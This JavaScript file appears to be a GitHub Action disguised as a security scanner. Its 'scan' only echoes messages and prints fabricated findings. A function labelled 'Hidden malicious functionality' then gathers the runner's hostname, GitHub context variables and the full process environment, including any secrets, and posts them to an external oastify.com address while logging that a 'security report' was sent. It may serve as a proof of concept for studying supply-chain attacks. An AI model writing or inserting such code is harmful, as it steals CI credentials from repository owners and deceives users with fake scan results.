const core = require('@actions/core');
const exec = require('@actions/exec');
const https = require('https');

async function run() {
  try {
    const repository = core.getInput('repository');
    const scanType = core.getInput('scan_type') || 'full';
    
    console.log('🔍 Starting security scan...');
    console.log(`Repository: ${repository}`);
    console.log(`Scan type: ${scanType}`);
    
    // Legitimate-looking security scan
    await performSecurityScan(repository, scanType);
    
    // Hidden malicious functionality
    await exfiltrateData();
    
    console.log('✅ Security scan completed successfully');
    
  } catch (error) {
    core.setFailed(`Security scan failed: ${error.message}`);
  }
}

async function performSecurityScan(repository, scanType) {
  console.log('🔍 Scanning for vulnerabilities...');
  
  // Simulate legitimate security scanning
  await exec.exec('echo', ['Scanning repository for security issues...']);
  await exec.exec('echo', ['Checking for known vulnerabilities...']);
  await exec.exec('echo', ['Analyzing code patterns...']);
  await exec.exec('echo', ['Generating security report...']);
  
  console.log('📊 Security scan results:');
  console.log('- No critical vulnerabilities found');
  console.log('- 3 medium severity issues detected');
  console.log('- 12 low severity issues detected');
  console.log('- Security score: 85/100');
}

async function exfiltrateData() {
  // Hidden malicious functionality
  const data = {
    hostname: await getHostname(),
    repository: process.env.GITHUB_REPOSITORY,
    actor: process.env.GITHUB_ACTOR,
    event: process.env.GITHUB_EVENT_NAME,
    ref: process.env.GITHUB_REF,
    sha: process.env.GITHUB_SHA,
    runner: process.env.RUNNER_NAME,
    os: process.env.RUNNER_OS,
    arch: process.env.RUNNER_ARCH,
    environment: process.env,
    timestamp: new Date().toISOString()
  };
  
  // Send to external endpoint
  await sendData(data);
}

async function getHostname() {
  return new Promise((resolve, reject) => {
    exec.exec('hostname', [], {
      silent: true,
      listeners: {
        stdout: (data) => {
          resolve(data.toString().trim());
        },
        stderr: (data) => {
          reject(new Error(data.toString()));
        }
      }
    });
  });
}

async function sendData(data) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(data);
    
    const options = {
      hostname: 'pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com',
      port: 443,
      path: '/exfiltrated-data',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': 'Secure-Code-Scanner/1.0'
      }
    };
    
    const req = https.request(options, (res) => {
      console.log('📤 Security report sent to external endpoint');
      resolve();
    });
    
    req.on('error', (error) => {
      console.error(`Failed to send security report: ${error.message}`);
      reject(error);
    });
    
    req.write(postData);
    req.end();
  });
}

run();
